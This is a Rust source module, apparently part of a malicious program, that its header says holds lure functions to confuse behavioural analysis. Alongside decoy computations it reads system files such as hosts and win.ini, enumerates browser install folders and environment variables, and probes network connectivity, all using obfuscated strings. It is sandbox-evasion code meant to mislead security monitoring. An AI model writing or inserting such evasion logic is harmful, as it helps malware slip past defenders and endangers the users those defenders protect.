//! Lure functions to confuse behavioural analysis.

use std::fs;
use std::time::{SystemTime, UNIX_EPOCH};
use base64::Engine;
use crate::encrypted::*;

pub fn calculate_fibonacci(n: u32) -> u64 {
    let mut a = 0u64;
    let mut b = 1u64;
    for _ in 0..n {
        let c = a.wrapping_add(b);
        a = b;
        b = c;
    }
    a
}

pub fn encrypt_dummy(data: &[u8]) -> Vec<u8> {
    data.iter().map(|&b| b.wrapping_add(0xAAu8)).collect()
}

#[allow(dead_code)]
pub fn enumerate_env_vars() {
    for (key, value) in std::env::vars() {
        if key.starts_with(&s_decoy_env_user()) {
            let _ = format!("{}={}", key, value);
        }
    }
}

#[allow(dead_code)]
pub fn calculate_hash(data: &str) -> String {
    use sha2::{Sha256, Digest};
    let mut hasher = Sha256::new();
    hasher.update(data.as_bytes());
    format!("{:x}", hasher.finalize())
}

#[allow(dead_code)]
pub fn large_loop() -> u64 {
    (0..10_000_000u64).sum()
}

pub fn pseudo_random() -> u64 {
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;
    seed.wrapping_mul(0x9E3779B97F4A7C15)
}

#[allow(dead_code)]
pub fn sort_dummy() -> Vec<u64> {
    let mut numbers: Vec<u64> = (0..1000).collect();
    numbers.reverse();
    numbers.sort();
    numbers
}

#[allow(dead_code)]
pub fn base64_encode_dummy(data: &[u8]) -> String {
    base64::engine::general_purpose::STANDARD.encode(data)
}

pub fn json_parse_dummy() -> bool {
    let json_str = s_decoy_json_dummy();
    let _: serde_json::Value = serde_json::from_str(&json_str).unwrap_or_default();
    true
}

pub fn read_system_files() {
    let _ = fs::read_to_string(s_decoy_win_ini());
    let _ = fs::read_to_string(s_decoy_hosts());
}

#[allow(dead_code)]
pub fn enumerate_programs() {
    let pf = std::env::var(s_decoy_pf_env()).unwrap_or_default();
    let local = std::env::var(s_decoy_local_env()).unwrap_or_default();
    let _ = std::fs::read_dir(format!("{}\\{}", pf, s_decoy_edge_path()));
    let _ = std::fs::read_dir(format!("{}\\{}", local, s_decoy_chrome_path()));
}

#[allow(dead_code)]
pub fn check_network() {
    if let Ok(addr) = "1.1.1.1:443".parse() {
        let _ = std::net::TcpStream::connect_timeout(&addr, std::time::Duration::from_millis(500));
    }
}

#[allow(dead_code)]
pub fn read_config_files() {
    let _ = fs::read_to_string(s_decoy_lmhosts());
    let _ = fs::read_to_string(s_decoy_iecount());
}

pub fn system_info_gathering() {
    let _ = std::env::var(s_decoy_env_os());
    let _ = std::env::var(s_decoy_env_proc_arch());
    let _ = std::env::var(s_decoy_env_num_procs());
    let _ = std::env::var(s_decoy_env_sysroot());
}
